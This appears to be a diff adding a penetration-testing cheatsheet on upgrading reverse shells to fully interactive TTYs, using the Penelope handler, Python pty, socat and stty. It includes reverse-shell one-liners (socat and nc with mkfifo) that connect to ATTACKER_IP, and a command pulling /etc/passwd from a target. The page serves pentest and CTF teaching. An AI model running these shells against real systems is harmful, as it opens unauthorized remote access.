@@ -1,0 +1,234 @@
+---
+title: "Shell Upgrade Cheatsheet"
+excerpt: "Complete guide to upgrading dumb shells to fully interactive TTYs during penetration testing"
+---
+
+# Shell Upgrade Cheatsheet
+
+> Upgrading a basic reverse shell to a fully interactive TTY is essential for running interactive programs (`vim`, `nano`, `top`, `sudo`, password prompts) and maintaining stable access during engagements.
+
+---
+
+## Table of Contents
+
+- [The Modern Way: Penelope (Recommended)](#the-modern-way-penelope-recommended)
+  - [Installation](#installation)
+  - [Basic Usage](#basic-usage)
+  - [Key Features](#key-features)
+  - [Penelope Session Commands](#penelope-session-commands)
+- [🛠️ Manual Upgrade Methods](#manual-upgrade-methods)
+  - [Method 1: Python PTY (Most Common)](#method-1-python-pty-most-common)
+  - [Method 2: Script Command ](#method-2-script-command)
+  - [Method 3: Socat ](#method-3-socat)
+  - [Method 4: Using stty/nc (No Python)](#method-4-using-stty-nc-no-python)
+- [The Full Interactive TTY Upgrade](#the-full-interactive-tty-upgrade)
+  - [Step-by-Step](#step-by-step)
+  - [Quick Version (If You Know Your Terminal Size)](#quick-version-if-you-know-your-terminal-size)
+- [Alternative Languages & Tools](#alternative-languages-tools)
+  - [Perl](#perl)
+  - [Ruby](#ruby)
+  - [Lua](#lua)
+  - [AWK](#awk)
+  - [Using /bin/sh (Minimal)](#using-bin-sh-minimal)
+- [Terminal Size Reference](#terminal-size-reference)
+- [🔗 Resources](#resources)
+
+---
+
+## The Modern Way: Penelope (Recommended)
+
+**Penelope** is a modern shell handler that automates PTY upgrades, session management, file transfers, and logging. It's a game-changer for penetration testers and CTF players. 
+
+### Installation
+
+```bash
+# Kali Linux
+sudo apt update && sudo apt install penelope
+
+# Standalone (no dependencies)
+wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
+
+# pipx
+pipx install git+https://github.com/brightio/penelope
+```
+
+### Basic Usage
+
+```bash
+# Start listener on default port (4444)
+python3 penelope.py
+
+# Listen on specific port
+python3 penelope.py -p 4444,5555
+
+# Show payload hints for active listeners
+python3 penelope.py -a
+
+# OSCP-safe mode (disables auto-exploitation modules)
+python3 penelope.py -O
+```
+
+### Key Features
+
+| Feature | Description |
+|---------|-------------|
+| **Auto-upgrade** | Automatically upgrades shells to PTY without manual steps |
+| **Multi-session** | Manage multiple shells simultaneously |
+| **File Transfer** | Built-in `upload` and `download` commands |
+| **Logging** | Automatic session logging with timestamps |
+| **Session Menu** | Press `F12` to access session manager |
+| **OSCP Safe** | Use `-O` flag for exam compliance  |
+
+### Penelope Session Commands
+
+```bash
+# Inside Penelope menu (press F12)
+listeners add -p 5555    # Add new listener
+sessions                 # List active sessions
+interact 2               # Switch to session 2
+upload /local/file.txt   # Upload file to target
+download /etc/passwd     # Download file from target
+maintain 3               # Keep 3 active shells per host
+```
+
+---
+
+## 🛠️ Manual Upgrade Methods
+
+When you can't use Penelope, use these classic techniques.
+
+### Method 1: Python PTY (Most Common)
+
+```python
+# Python 2
+python -c 'import pty; pty.spawn("/bin/bash")'
+/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
+
+# Python 3
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+### Method 2: Script Command 
+
+```bash
+# Most reliable when python is unavailable
+/usr/bin/script -qc /bin/bash /dev/null
+
+# Alternative using expect
+/usr/bin/expect -c 'spawn /bin/bash; interact'
+```
+
+### Method 3: Socat 
+
+```bash
+# On attacker machine (listener)
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+# On target (connect back)
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
+```
+
+### Method 4: Using stty/nc (No Python)
+
+```bash
+# In reverse shell
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
+```
+
+---
+
+## The Full Interactive TTY Upgrade
+
+This is the **classic 5-step method** for maximum compatibility when you have a basic Python PTY.
+
+### Step-by-Step
+
+```bash
+# 1. Spawn Python shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# 2. Background the shell
+Ctrl + Z
+
+# 3. Get terminal size from your local machine
+stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
+
+# 4. Bring shell back to foreground with raw mode
+stty raw -echo; fg
+
+# 5. Set terminal size (replace ROWS and COLS with values from step 3)
+stty rows ROWS cols COLS
+
+# 6. Enable colors and full terminal features
+export TERM=xterm-256color
+
+# 7. Reload bash to apply settings
+exec /bin/bash
+```
+
+### Quick Version (If You Know Your Terminal Size)
+
+```bash
+# Spawn shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+# Set basic terminal
+export TERM=xterm
+
+# Background shell
+Ctrl + Z
+
+# Foreground with raw mode
+stty raw -echo; fg
+```
+
+---
+
+## Alternative Languages & Tools
+
+### Perl
+```perl
+perl -e 'exec "/bin/bash";'
+```
+
+### Ruby
+```ruby
+ruby -e 'exec "/bin/bash"'
+```
+
+### Lua
+```lua
+lua -e 'os.execute("/bin/bash")'
+```
+
+### AWK
+```awk
+awk 'BEGIN {system("/bin/bash")}'
+```
+
+### Using /bin/sh (Minimal)
+```bash
+/bin/sh -i
+```
+
+---
+
+## Terminal Size Reference
+
+| Command | Purpose |
+|---------|---------|
+| `stty size` | Quick rows/cols output |
+| `stty -a` | Full terminal settings |
+| `stty rows 50 cols 200` | Set manual size |
+| `resize` | Auto-detect size (if available) |
+
+**Tip:** Before backgrounding your shell, run `stty -a` in your **local** terminal and note the `rows` and `columns` values. Use these exact values in step 5.
+
+---
+
+## 🔗 Resources
+
+- [Penelope GitHub](https://github.com/brightio/penelope) - Modern shell handler 
+- [Pentest Monkey Reverse Shell Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+- [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) 
